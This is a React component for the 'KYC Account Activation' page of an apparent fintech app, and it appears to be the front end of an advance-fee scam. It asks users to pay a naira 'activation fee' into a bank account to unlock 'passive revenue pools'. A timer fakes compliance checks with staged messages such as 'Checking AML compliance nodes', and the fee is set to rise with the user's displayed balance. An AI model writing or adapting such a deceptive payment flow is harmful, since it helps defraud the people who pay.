import React, { useState } from 'react';
import { ArrowLeft, Copy, Check, Upload, ShieldAlert, CheckCircle2, FileImage, CreditCard } from 'lucide-react';
import { User } from '../types';

interface KYCPageProps {
  user: User;
  onBack: () => void;
  onSubmitKYC: (proofBase64: string, plan: 'two_key' | 'three_key' | 'unlimited') => void;
}

const LOADING_STEPS = [
  'Initializing compliance connection...',
  'Retrieving secure company accounts...',
  'Checking AML compliance nodes...',
  'Mapping instant automated narration tags...',
  'Generating dedicated escrow credentials...',
];

export default function KYCPage({ user, onBack, onSubmitKYC }: KYCPageProps) {
  const [copied, setCopied] = useState(false);
  const [proof, setProof] = useState<string | null>(null);
  const [proofFileName, setProofFileName] = useState<string>('');
  const [dragActive, setDragActive] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submittingError, setSubmittingError] = useState('');
  const [selectedPlan, setSelectedPlan] = useState<'two_key' | 'three_key' | 'unlimited'>('two_key');

  // Dynamic company payment details from localStorage (modifiable by Admin)
  const [accountDetails, setAccountDetails] = useState(() => {
    const saved = localStorage.getItem('velora_company_account');
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch (e) {
        console.error('Failed to parse dynamic company details', e);
      }
    }
    return {
      bankName: 'Wema Bank (Velora Digital)',
      accountNumber: '0123958373',
      accountName: 'Velora Fintech Solutions',
      fee: 7500,
    };
  });

  // Dynamic plan fee calculation based on user balance and selected plan
  const getDynamicPlanFee = (planId: 'two_key' | 'three_key' | 'unlimited') => {
    let basePlanFee = 7500;
    if (planId === 'three_key') basePlanFee = 10750;
    if (planId === 'unlimited') basePlanFee = 17800;

    // Apply scaling increment if balance >= 100,000
    const userBalance = user.balance;
    if (userBalance >= 100000) {
      const baseIncrease = 4000; // 11,500 - 7,500
      const extraSteps = Math.floor((userBalance - 100000) / 50000);
      const totalIncrease = baseIncrease + (extraSteps * 2000);
      return basePlanFee + totalIncrease;
    }
    return basePlanFee;
  };

  const getPlanName = (plan?: string) => {
    if (plan === 'two_key') return 'Basic (2 Keys/day)';
    if (plan === 'three_key') return 'Premium (3 Keys/day)';
    if (plan === 'unlimited') return 'Unlimited (Unlimited Keys/day)';
    return 'Verification';
  };

  // 7-second unlocking state machine
  const [unlockState, setUnlockState] = useState<'locked' | 'unlocking' | 'unlocked'>(() => {
    if (user.kycStatus === 'pending' || user.kycStatus === 'verified') {
      return 'unlocked';
    }
    const saved = localStorage.getItem(`velora_kyc_unlocked_${user.email}`);
    return saved === 'true' ? 'unlocked' : 'locked';
  });
  const [countdown, setCountdown] = useState(7);
  const [loadingStep, setLoadingStep] = useState(0);

  const handleStartUnlock = () => {
    setUnlockState('unlocking');
    setCountdown(7);
    setLoadingStep(0);

    const interval = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(interval);
          setUnlockState('unlocked');
          localStorage.setItem(`velora_kyc_unlocked_${user.email}`, 'true');
          return 0;
        }

        const elapsed = 7 - (prev - 1);
        if (elapsed < 2) setLoadingStep(0);
        else if (elapsed < 3) setLoadingStep(1);
        else if (elapsed < 5) setLoadingStep(2);
        else if (elapsed < 6) setLoadingStep(3);
        else setLoadingStep(4);

        return prev - 1;
      });
    }, 1000);
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(accountDetails.accountNumber);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // Handle file reading
  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      processFile(file);
    }
  };

  const processFile = (file: File) => {
    if (!file.type.startsWith('image/')) {
      setSubmittingError('Please upload an image file (PNG, JPG, JPEG, WEBP) as proof of payment.');
      return;
    }

    if (file.size > 3 * 1024 * 1024) { // Limit to 3MB for localStorage capacity
      setSubmittingError('Payment receipt image is too large. Please upload an image smaller than 3MB.');
      return;
    }

    setSubmittingError('');
    setProofFileName(file.name);

    const reader = new FileReader();
    reader.onload = (event) => {
      if (event.target?.result) {
        setProof(event.target.result as string);
      }
    };
    reader.onerror = () => {
      setSubmittingError('Failed to read payment proof image file. Please try again.');
    };
    reader.readAsDataURL(file);
  };

  // Drag and drop handlers
  const handleDrag = (e: React.DragEvent) => {
    e.preventDefault();
    e.stopPropagation();
    if (e.type === 'dragenter' || e.type === 'dragover') {
      setDragActive(true);
    } else if (e.type === 'dragleave') {
      setDragActive(false);
    }
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    e.stopPropagation();
    setDragActive(false);

    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      processFile(e.dataTransfer.files[0]);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!proof) {
      setSubmittingError('Please upload a valid payment receipt screenshot before submitting.');
      return;
    }

    setIsSubmitting(true);
    // Simulate slight submission delay for realism
    setTimeout(() => {
      onSubmitKYC(proof, selectedPlan);
      setIsSubmitting(false);
    }, 1200);
  };

  const pendingFee = getDynamicPlanFee(user.kycPlan || 'two_key');

  return (
    <div className="flex flex-col h-full bg-white dark:bg-zinc-900 transition-colors duration-300">
      {/* Header */}
      <div className="flex items-center gap-4 py-4 border-b border-slate-100 dark:border-zinc-800 mb-6">
        <button
          onClick={onBack}
          className="p-2 rounded-full hover:bg-slate-100 dark:hover:bg-zinc-850 text-zinc-600 dark:text-zinc-400 transition-colors cursor-pointer"
        >
          <ArrowLeft className="w-5 h-5" />
        </button>
        <div>
          <h2 className="text-base font-extrabold text-zinc-900 dark:text-white tracking-tight">KYC Account Activation</h2>
          <p className="text-[10px] text-zinc-400">Unlock borderless transactions in minutes</p>
        </div>
      </div>

      {user.kycStatus === 'pending' ? (
        <div className="flex-1 flex flex-col items-center justify-center text-center p-6 space-y-4">
          <div className="w-16 h-16 rounded-full bg-amber-50 dark:bg-amber-950/20 flex items-center justify-center text-amber-500 animate-pulse">
            <ShieldAlert className="w-8 h-8" />
          </div>
          <h3 className="text-lg font-extrabold text-zinc-800 dark:text-white">KYC Verification Pending</h3>
          <p className="text-xs text-zinc-500 dark:text-zinc-400 max-w-sm leading-relaxed">
            Your payment proof for the <strong className="font-extrabold text-amber-600 dark:text-amber-400">{getPlanName(user.kycPlan)}</strong> activation fee of <strong className="font-bold">₦{pendingFee.toLocaleString()}</strong> is currently being reviewed by our compliance administrators. 
            Once approved, your account benefits and daily passive pools will be unlocked immediately.
          </p>
          <div className="p-4 bg-zinc-50 dark:bg-zinc-950 rounded-2xl border border-slate-100 dark:border-zinc-800 w-full text-left">
            <span className="text-[10px] font-bold text-zinc-400 uppercase tracking-wider block mb-1">Uploaded Proof:</span>
            <span className="text-xs font-semibold text-zinc-700 dark:text-zinc-300 flex items-center gap-2">
              <FileImage className="w-4 h-4 text-orange-500" />
              Receipt submitted successfully
            </span>
          </div>
          <button
            onClick={onBack}
            className="w-full py-3.5 bg-zinc-900 hover:bg-zinc-800 dark:bg-orange-500 dark:hover:bg-orange-600 text-white font-bold rounded-2xl text-xs transition-all shadow-md cursor-pointer"
          >
            Go Back to Dashboard
          </button>
        </div>
      ) : user.kycStatus === 'verified' ? (
        <div className="flex-1 flex flex-col items-center justify-center text-center p-6 space-y-4">
          <div className="w-16 h-16 rounded-full bg-emerald-50 dark:bg-emerald-950/20 flex items-center justify-center text-emerald-500">
            <CheckCircle2 className="w-8 h-8" />
          </div>
          <h3 className="text-lg font-extrabold text-zinc-800 dark:text-white">KYC Verification Approved</h3>
          <p className="text-xs text-zinc-500 dark:text-zinc-400 max-w-sm leading-relaxed">
            Congratulations! Your account is fully verified. You can now use all primary options including 
            unlimited currency trading, virtual cards, and payment services with zero restrictions.
          </p>
          <button
            onClick={onBack}
            className="w-full py-3.5 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-2xl text-xs transition-all shadow-md cursor-pointer"
          >
            Open Dashboard
          </button>
        </div>
      ) : unlockState === 'locked' ? (
        <div className="flex-1 flex flex-col items-center justify-center text-center p-6 space-y-6">
          <div className="w-16 h-16 rounded-full bg-orange-50 dark:bg-orange-950/20 flex items-center justify-center text-orange-500 shadow-sm">
            <CreditCard className="w-8 h-8" />
          </div>
          <div className="space-y-2">
            <h3 className="text-base font-extrabold text-zinc-900 dark:text-white">KYC Verification Gate</h3>
            <p className="text-xs text-zinc-500 dark:text-zinc-400 max-w-sm leading-relaxed">
              Verify your identity with an activation deposit to unlock instant fiat withdrawals, virtual cards, and high-volume trades.
            </p>
          </div>
          <button
            onClick={handleStartUnlock}
            className="w-full py-4 bg-orange-500 hover:bg-orange-600 text-white font-extrabold rounded-2xl text-xs transition-all shadow-md hover:shadow-orange-500/10 cursor-pointer flex items-center justify-center gap-2"
          >
            Unlock KYC & Generate Escrow Details
          </button>
        </div>
      ) : unlockState === 'unlocking' ? (
        <div className="flex-1 flex flex-col items-center justify-center text-center p-6 space-y-6">
          <div className="relative w-20 h-20 flex items-center justify-center">
            <div className="absolute inset-0 border-4 border-slate-100 dark:border-zinc-800 rounded-full" />
            <div className="absolute inset-0 border-4 border-orange-500 border-t-transparent rounded-full animate-spin" />
            <span className="text-sm font-black text-zinc-850 dark:text-zinc-250 font-mono">{countdown}s</span>
          </div>
          <div className="space-y-2">
            <h3 className="text-xs font-black text-zinc-800 dark:text-white uppercase tracking-wider animate-pulse">
              {LOADING_STEPS[loadingStep]}
            </h3>
            <p className="text-[10px] text-zinc-400 max-w-xs leading-relaxed">
              Connecting to secure central compliance network...
            </p>
          </div>
          <div className="w-full max-w-xs bg-slate-100 dark:bg-zinc-800 h-1.5 rounded-full overflow-hidden">
            <div 
              className="bg-orange-500 h-full transition-all duration-300" 
              style={{ width: `${((7 - countdown) / 7) * 100}%` }}
            />
          </div>
        </div>
      ) : (
        <div className="flex-1 overflow-y-auto no-scrollbar space-y-6 pb-6">
          {/* Promo Card */}
          <div className="p-4 bg-gradient-to-br from-amber-400 via-amber-500 to-yellow-600 text-zinc-950 rounded-3xl shadow-md space-y-1.5 relative overflow-hidden">
            <div className="absolute top-[-30%] right-[-10%] w-[50%] h-[120%] bg-white/20 rounded-full blur-xl pointer-events-none" />
            <h3 className="text-xs font-black uppercase tracking-wider opacity-90">One-time Activation Fee</h3>
            <p className="text-2xl font-black text-zinc-950">₦{getDynamicPlanFee(selectedPlan).toLocaleString()}</p>
            <p className="text-[10px] opacity-90 leading-relaxed font-semibold">
              Pay the {selectedPlan === 'two_key' ? 'Basic' : selectedPlan === 'three_key' ? 'Premium' : 'Unlimited'} KYC activation fee of <strong className="font-black">₦{getDynamicPlanFee(selectedPlan).toLocaleString()}</strong> into our bank account below and upload your transfer slip to unlock daily revenue passive pools.
            </p>
          </div>

          {/* Plan Selector */}
          <div className="space-y-2.5">
            <label className="text-[11px] font-black text-zinc-400 uppercase tracking-wider block">Select KYC Plan & Benefits</label>
            <div className="grid grid-cols-1 gap-2.5">
              {[
                {
                  id: 'two_key',
                  name: 'Basic Revenue Partner',
                  price: getDynamicPlanFee('two_key'),
                  benefits: '2 keys for joining two revenue per day'
                },
                {
                  id: 'three_key',
                  name: 'Premium Revenue Partner',
                  price: getDynamicPlanFee('three_key'),
                  benefits: 'Benefit for joining three revenue per day'
                },
                {
                  id: 'unlimited',
                  name: 'Unlimited Revenue Partner',
                  price: getDynamicPlanFee('unlimited'),
                  benefits: 'Unlimited joining of revenue per day'
                }
              ].map((plan) => {
                const isSelected = selectedPlan === plan.id;
                return (
                  <button
                    key={plan.id}
                    type="button"
                    onClick={() => setSelectedPlan(plan.id as any)}
                    className={`p-3.5 rounded-2xl text-left border transition-all flex flex-col justify-between gap-1.5 cursor-pointer ${
                      isSelected
                        ? 'border-amber-500 bg-amber-500/5 dark:bg-amber-500/10 shadow-sm'
                        : 'border-slate-200 dark:border-zinc-800 bg-white dark:bg-zinc-900 hover:border-slate-300 dark:hover:border-zinc-700'
                    }`}
                  >
                    <div className="flex justify-between items-center w-full">
                      <span className={`text-xs font-black ${isSelected ? 'text-amber-500' : 'text-zinc-800 dark:text-zinc-200'}`}>
                        {plan.name}
                      </span>
                      <span className={`text-xs font-black ${isSelected ? 'text-amber-500' : 'text-zinc-900 dark:text-white'}`}>
                        ₦{plan.price.toLocaleString()}
                      </span>
                    </div>
                    <p className="text-[10px] text-zinc-500 dark:text-zinc-400 font-medium">
                      {plan.benefits}
                    </p>
                  </button>
                );
              })}
            </div>
          </div>

          {/* OPay Strict Prohibition Warning Card */}
          <div className="p-4 bg-red-50 dark:bg-red-950/20 border-2 border-red-200 dark:border-red-900/30 rounded-3xl flex items-start gap-3">
            <ShieldAlert className="w-5 h-5 text-red-500 shrink-0 mt-0.5" />
            <div className="space-y-1">
              <h5 className="text-[11px] font-extrabold text-red-700 dark:text-red-400 uppercase tracking-wider">⚠️ DO NOT PAY VIA OPAY</h5>
              <p className="text-[10px] text-red-600 dark:text-red-450 leading-relaxed font-semibold">
                Transfer from <strong className="font-black text-red-700 dark:text-red-400">OPay accounts is strictly NOT ALLOWED</strong> and will fail compliance routing. Please use other banks like <strong className="font-black text-red-700 dark:text-red-450">Kuda, PalmPay, GTBank, Zenith, Access Bank, Moniepoint</strong>, etc., which are fully automated and verified instantly.
              </p>
            </div>
          </div>

          {/* Account Details Box */}
          <div className="p-5 bg-slate-50 dark:bg-zinc-950 rounded-3xl border border-slate-100 dark:border-zinc-850 space-y-4 shadow-inner">
            <h4 className="text-[11px] font-bold text-zinc-400 uppercase tracking-wider">Company Payment Details</h4>
            
            <div className="space-y-3.5">
              <div>
                <span className="text-[10px] text-zinc-400 block">Bank Name</span>
                <span className="text-xs font-bold text-zinc-800 dark:text-zinc-200">{accountDetails.bankName}</span>
              </div>

              <div>
                <span className="text-[10px] text-zinc-400 block">Account Number</span>
                <div className="flex items-center justify-between mt-1">
                  <span className="text-sm font-mono font-black text-zinc-900 dark:text-white tracking-widest">{accountDetails.accountNumber}</span>
                  <button
                    onClick={handleCopy}
                    className="p-2 bg-white dark:bg-zinc-900 hover:bg-slate-100 dark:hover:bg-zinc-850 rounded-xl border border-slate-200/50 dark:border-zinc-800 text-zinc-500 dark:text-zinc-400 transition-colors flex items-center justify-center gap-1.5 cursor-pointer"
                  >
                    {copied ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                    <span className="text-[10px] font-bold">{copied ? 'Copied' : 'Copy'}</span>
                  </button>
                </div>
              </div>

              <div>
                <span className="text-[10px] text-zinc-400 block">Account Name</span>
                <span className="text-xs font-bold text-zinc-800 dark:text-zinc-200 uppercase">{accountDetails.accountName}</span>
              </div>

              <div className="p-3 bg-amber-50 dark:bg-amber-950/15 border border-amber-100 dark:border-amber-900/30 rounded-2xl flex items-start gap-2.5">
                <ShieldAlert className="w-4 h-4 text-amber-500 mt-0.5 shrink-0" />
                <p className="text-[10px] text-amber-700 dark:text-amber-400 leading-normal">
                  <strong>Important:</strong> Ensure you include your username <code className="bg-amber-100 dark:bg-amber-900/35 px-1 py-0.5 rounded font-bold">"{user.username}"</code> as narration or transfer reference for swift automated verification.
                </p>
              </div>
            </div>
          </div>

          {/* Form and Proof Upload */}
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <label className="text-[11px] font-bold text-zinc-400 uppercase tracking-wider block">Upload Payment Proof</label>
              
              <div
                onDragEnter={handleDrag}
                onDragOver={handleDrag}
                onDragLeave={handleDrag}
                onDrop={handleDrop}
                className={`border-2 border-dashed rounded-3xl p-6 text-center transition-all ${
                  dragActive 
                    ? 'border-orange-500 bg-orange-500/5' 
                    : proof 
                      ? 'border-emerald-500/50 bg-emerald-500/5' 
                      : 'border-slate-200 dark:border-zinc-800 bg-slate-50 dark:bg-zinc-950'
                }`}
              >
                {proof ? (
                  <div className="space-y-3 flex flex-col items-center">
                    <div className="relative max-w-[120px] max-h-[120px] overflow-hidden rounded-xl border border-slate-200 shadow-inner">
                      <img src={proof} alt="Proof of payment" className="object-cover w-full h-full" />
                    </div>
                    <div>
                      <p className="text-xs font-bold text-zinc-800 dark:text-zinc-200 truncate max-w-[200px]">
                        {proofFileName || 'Receipt.png'}
                      </p>
                      <button
                        type="button"
                        onClick={() => {
                          setProof(null);
                          setProofFileName('');
                        }}
                        className="text-[10px] font-bold text-red-500 hover:underline mt-1 bg-transparent border-none cursor-pointer"
                      >
                        Change Image
                      </button>
                    </div>
                  </div>
                ) : (
                  <div className="space-y-3">
                    <div className="w-12 h-12 rounded-2xl bg-orange-100 dark:bg-orange-950/20 text-orange-500 flex items-center justify-center mx-auto shadow-inner">
                      <Upload className="w-6 h-6" />
                    </div>
                    <div>
                      <p className="text-xs font-bold text-zinc-700 dark:text-zinc-300">
                        Drag and drop receipt image, or <span className="text-orange-500 hover:underline cursor-pointer">browse</span>
                      </p>
                      <p className="text-[10px] text-zinc-400 mt-1">Supports PNG, JPG, JPEG, WEBP (Max 3MB)</p>
                    </div>
                    <input
                      type="file"
                      accept="image/*"
                      onChange={handleFileChange}
                      className="hidden"
                      id="kyc-file-upload"
                    />
                    <label
                      htmlFor="kyc-file-upload"
                      className="inline-block px-4 py-2 bg-white dark:bg-zinc-900 border border-slate-200 dark:border-zinc-800 rounded-xl text-[10px] font-bold text-zinc-700 dark:text-zinc-300 hover:bg-slate-50 dark:hover:bg-zinc-850 cursor-pointer shadow-sm transition-all"
                    >
                      Choose File
                    </label>
                  </div>
                )}
              </div>
            </div>

            {submittingError && (
              <div className="p-3 bg-red-50 dark:bg-red-950/20 text-red-600 dark:text-red-400 text-xs rounded-xl border border-red-100 dark:border-red-950/50">
                {submittingError}
              </div>
            )}

            <button
              type="submit"
              disabled={isSubmitting || !proof}
              className={`w-full py-3.5 font-bold rounded-2xl text-xs transition-all shadow-md flex items-center justify-center gap-2 cursor-pointer ${
                proof 
                  ? 'bg-zinc-900 hover:bg-zinc-800 dark:bg-orange-500 dark:hover:bg-orange-600 text-white' 
                  : 'bg-slate-100 dark:bg-zinc-850 text-zinc-400 dark:text-zinc-600 cursor-not-allowed'
              }`}
            >
              {isSubmitting ? (
                <>
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  Submitting KYC Proof...
                </>
              ) : (
                'Submit Proof for Verification'
              )}
            </button>
          </form>
        </div>
      )}
    </div>
  );
}
